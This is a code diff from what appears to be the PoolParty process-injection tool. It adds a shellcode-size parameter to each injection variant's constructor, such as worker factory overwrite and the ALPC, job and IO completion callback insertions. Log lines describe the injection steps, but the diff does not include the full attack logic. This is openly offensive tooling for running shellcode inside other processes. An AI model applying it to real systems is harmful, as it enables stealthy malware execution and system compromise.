@@ -55,8 +55,8 @@ void PoolParty::Inject()
 	BOOST_LOG_TRIVIAL(info) << "PoolParty attack completed successfully";
 }
 
-WorkerFactoryStartRoutineOverwrite::WorkerFactoryStartRoutineOverwrite(DWORD dwTargetPid, unsigned char* cShellcode)
-	: PoolParty{ dwTargetPid, cShellcode }
+WorkerFactoryStartRoutineOverwrite::WorkerFactoryStartRoutineOverwrite(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
 {
 }
 
@@ -73,8 +73,8 @@ void WorkerFactoryStartRoutineOverwrite::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << boost::format("Set target process worker factory minimum threads to: %d") % WorkerFactoryMinimumThreadNumber;
 }
 
-RemoteWorkItemInsertion::RemoteWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode) 
-	: PoolParty{dwTargetPid, cShellcode} 
+RemoteWorkItemInsertion::RemoteWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
 {
 }
 
@@ -111,8 +111,8 @@ void RemoteWorkItemInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << "Modified the target process's TP_POOL task queue list entry to point to the specially crafted TP_WORK";
 }
 
-RemoteWaitCallbackInsertion::RemoteWaitCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
-	: PoolParty{ dwTargetPid, cShellcode }
+RemoteWaitCallbackInsertion::RemoteWaitCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
 {
 }
 
@@ -148,8 +148,8 @@ void RemoteWaitCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << "Set event to queue a packet to the IO completion port of the target process worker factory ";
 }
 
-RemoteIoCompletionCallbackInsertion::RemoteIoCompletionCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
-	: PoolParty{ dwTargetPid, cShellcode }
+RemoteIoCompletionCallbackInsertion::RemoteIoCompletionCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
 {
 }
 
@@ -196,8 +196,8 @@ void RemoteIoCompletionCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << boost::format("Write to file `%s` to queue a packet to the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_FILE_NAME);
 }
 
-RemoteAlpcCallbackInsertion::RemoteAlpcCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
-	: PoolParty{ dwTargetPid, cShellcode }
+RemoteAlpcCallbackInsertion::RemoteAlpcCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
 {
 }
 
@@ -289,8 +289,8 @@ void RemoteAlpcCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << boost::format("Connected to ALPC port `%s` to queue a packet to the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_ALPC_PORT_NAME);
 }
 
-RemoteJobCallbackInsertion::RemoteJobCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
-	: PoolParty{ dwTargetPid, cShellcode }
+RemoteJobCallbackInsertion::RemoteJobCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
 {
 }
 
@@ -328,8 +328,8 @@ void RemoteJobCallbackInsertion::SetupExecution() const
 	BOOST_LOG_TRIVIAL(info) << boost::format("Assigned current process to job object `%s` to queue a packet to the IO completion port of the target process worker factory") % g_WideString_Converter.to_bytes(POOL_PARTY_JOB_NAME);
 }
 
-RemoteDirectCallbackInsertion::RemoteDirectCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
-	: PoolParty{ dwTargetPid, cShellcode }
+RemoteDirectCallbackInsertion::RemoteDirectCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
 {
 }
 
